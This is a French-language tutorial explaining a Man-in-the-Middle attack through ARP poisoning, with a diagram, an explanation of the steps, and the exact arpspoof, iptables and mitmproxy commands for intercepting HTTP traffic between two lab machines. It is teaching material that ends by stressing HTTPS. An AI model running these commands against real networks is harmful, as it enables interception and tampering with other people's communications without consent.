### Schéma et Explication Théorique d'une Attaque Man-in-the-Middle (MITM)

#### Schéma

```plaintext
+-------------------+       +-------------------+       +-------------------+
|     Victim1       |       |     Attacker      |       |     Victim2       |
|    (192.168.1.20) |       |   (192.168.1.10)  |       |    (192.168.1.30) |
|                   |       |                   |       |                   |
|       +--------+  |       |       +--------+  |       |       +--------+  |
|       |        |  |       |       |        |  |       |       |        |  |
|       |        |<---------|-------|        |<---------|-------|        |  |
|       |        |  |       |       |        |  |       |       |        |  |
|       +--------+  |       |       +--------+  |       |       +--------+  |
|                   |       |                   |       |                   |
+-------------------+       +-------------------+       +-------------------+
```

#### Explication Théorique

**1. Introduction à l'Attaque MITM**

Une attaque Man-in-the-Middle (MITM) est une attaque dans laquelle un acteur malveillant intercepte et éventuellement modifie les communications entre deux parties (victimes) sans leur consentement. Cette attaque permet à l'attaquant d'espionner, d'intercepter et de modifier les données transmises entre les deux victimes.

**2. Composants de l'Attaque**

- **Machine Attaquant (Attacker)** : Cette machine exécute l'attaque MITM. Elle intercepte et redirige le trafic entre les deux victimes.
- **Machine Victime 1 (Victim1)** : Cette machine représente la première cible de l'attaque. Elle envoie des données que l'attaquant intercepte.
- **Machine Victime 2 (Victim2)** : Cette machine représente la seconde cible de l'attaque. Elle reçoit des données que l'attaquant a interceptées ou modifiées.

**3. Étapes de l'Attaque MITM**

- **Étape 1 : Empoisonnement ARP**
  - L'attaquant utilise un outil comme `arpspoof` pour envoyer des messages ARP (Address Resolution Protocol) trompeurs aux deux victimes.
  - **Victim1** pense que l'adresse MAC de **Victim2** est celle de l'attaquant.
  - **Victim2** pense que l'adresse MAC de **Victim1** est celle de l'attaquant.

- **Étape 2 : Interception du Trafic**
  - En empoisonnant les tables ARP des victimes, l'attaquant positionne sa machine comme un relais pour tout le trafic entre **Victim1** et **Victim2**.
  - Toute communication entre **Victim1** et **Victim2** passe désormais par l'attaquant, permettant à ce dernier d'intercepter et potentiellement de modifier les données échangées.

- **Étape 3 : Redirection et Inspection du Trafic**
  - L'attaquant utilise `iptables` pour rediriger le trafic vers un outil de proxy MITM tel que `mitmproxy`.
  - `mitmproxy` permet à l'attaquant d'inspecter, d'enregistrer et de modifier les requêtes et réponses HTTP entre les deux victimes.

**4. Commandes Utilisées**

- **Activer le Transfert IP** : Permet à la machine attaquante de transférer des paquets entre les interfaces réseau.
  ```sh
  echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
  ```

- **Empoisonnement ARP** :
  - Empoisonner **Victim1** pour qu'elle pense que l'attaquant est **Victim2**.
    ```sh
    sudo arpspoof -i enp0s8 -t 192.168.1.20 192.168.1.30
    ```
  - Empoisonner **Victim2** pour qu'elle pense que l'attaquant est **Victim1**.
    ```sh
    sudo arpspoof -i enp0s8 -t 192.168.1.30 192.168.1.20
    ```

- **Rediriger le Trafic HTTP avec `iptables`** :
  - Redirige le trafic HTTP entrant vers `mitmproxy` qui fonctionne sur le port 8080.
    ```sh
    sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080
    ```

- **Lancer `mitmproxy`** : Intercepter et inspecter le trafic HTTP.
  ```sh
  sudo mitmproxy -p 8080
  ```

**5. Vérification et Conclusion**

- **Tester l'Attaque** : Accédez à un site web HTTP depuis **Victim1** et observez le trafic intercepté sur `mitmproxy` sur la machine attaquante.
- **Arrêter l'Attaque** :
  - Utilisez `Ctrl + C` pour arrêter `arpspoof` et `mitmproxy`.
  - Réinitialisez les règles `iptables` pour nettoyer les redirections :
    ```sh
    sudo iptables -t nat -F
    ```

En suivant ces étapes, vous pouvez illustrer et comprendre les mécanismes d'une attaque Man-in-the-Middle, en montrant comment un attaquant peut intercepter et manipuler les communications entre deux victimes. Ce type d'attaque met en lumière l'importance de la sécurité réseau, notamment l'utilisation de protocoles sécurisés comme HTTPS pour protéger les données en transit.
